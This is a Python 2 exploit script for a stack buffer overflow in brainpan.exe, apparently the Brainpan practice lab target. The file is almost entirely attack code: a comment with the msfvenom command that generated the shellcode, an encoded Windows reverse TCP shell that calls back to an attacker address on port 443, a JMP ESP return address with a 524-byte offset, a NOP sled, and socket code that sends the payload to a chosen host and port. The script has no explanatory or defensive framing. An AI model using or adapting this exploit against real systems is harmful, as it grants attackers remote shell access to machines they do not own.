#!/usr/bin/python
import time, struct, sys
import socket as so

#Command used for Windows Payload.. replace with your IP - msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.90.5 -e x86/shikata_ga_nai -b "\x00" -f py

buf =  ""
buf += "\xdb\xd9\xbe\x43\x0e\xb2\x62\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x70\x13\x03\x33\x1d\x50"
buf += "\x97\x4f\xc9\x16\x58\xaf\x0a\x77\xd0\x4a\x3b\xb7\x86"
buf += "\x1f\x6c\x07\xcc\x4d\x81\xec\x80\x65\x12\x80\x0c\x8a"
buf += "\x93\x2f\x6b\xa5\x24\x03\x4f\xa4\xa6\x5e\x9c\x06\x96"
buf += "\x90\xd1\x47\xdf\xcd\x18\x15\x88\x9a\x8f\x89\xbd\xd7"
buf += "\x13\x22\x8d\xf6\x13\xd7\x46\xf8\x32\x46\xdc\xa3\x94"
buf += "\x69\x31\xd8\x9c\x71\x56\xe5\x57\x0a\xac\x91\x69\xda"
buf += "\xfc\x5a\xc5\x23\x31\xa9\x17\x64\xf6\x52\x62\x9c\x04"
buf += "\xee\x75\x5b\x76\x34\xf3\x7f\xd0\xbf\xa3\x5b\xe0\x6c"
buf += "\x35\x28\xee\xd9\x31\x76\xf3\xdc\x96\x0d\x0f\x54\x19"
buf += "\xc1\x99\x2e\x3e\xc5\xc2\xf5\x5f\x5c\xaf\x58\x5f\xbe"
buf += "\x10\x04\xc5\xb5\xbd\x51\x74\x94\xa9\x96\xb5\x26\x2a"
buf += "\xb1\xce\x55\x18\x1e\x65\xf1\x10\xd7\xa3\x06\x56\xc2"
buf += "\x14\x98\xa9\xed\x64\xb1\x6d\xb9\x34\xa9\x44\xc2\xde"
buf += "\x29\x68\x17\x70\x79\xc6\xc8\x31\x29\xa6\xb8\xd9\x23"
buf += "\x29\xe6\xfa\x4c\xe3\x8f\x91\xb7\x64\x70\xcd\xed\x71"
buf += "\x18\x0c\x11\x7b\x63\x99\xf7\x11\x83\xcc\xa0\x8d\x3a"
buf += "\x55\x3a\x2f\xc2\x43\x47\x6f\x48\x60\xb8\x3e\xb9\x0d"
buf += "\xaa\xd7\x49\x58\x90\x7e\x55\x76\xbc\x1d\xc4\x1d\x3c"
buf += "\x6b\xf5\x89\x6b\x3c\xcb\xc3\xf9\xd0\x72\x7a\x1f\x29"
buf += "\xe2\x45\x9b\xf6\xd7\x48\x22\x7a\x63\x6f\x34\x42\x6c"
buf += "\x2b\x60\x1a\x3b\xe5\xde\xdc\x95\x47\x88\xb6\x4a\x0e"
buf += "\x5c\x4e\xa1\x91\x1a\x4f\xec\x67\xc2\xfe\x59\x3e\xfd"
buf += "\xcf\x0d\xb6\x86\x2d\xae\x39\x5d\xf6\xde\x73\xff\x5f"
buf += "\x77\xda\x6a\xe2\x1a\xdd\x41\x21\x23\x5e\x63\xda\xd0"
buf += "\x7e\x06\xdf\x9d\x38\xfb\xad\x8e\xac\xfb\x02\xae\xe4"

#JMP ESP address is 311712F3
payload = "A" * 524 + "\xf3\x12\x17\x31" + (900 - 524 - 4 - int(len(buf))) * "\x90" + buf

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.132.5 9999" % sys.argv[0]
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print "\n[+] Attempting to send buffer overflow to brainpan.exe...."
try:   
   s.connect((server,port))
   s.send(payload + '\r\n')
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to brainpan.exe. Check your IP address and port"
   sys.exit()
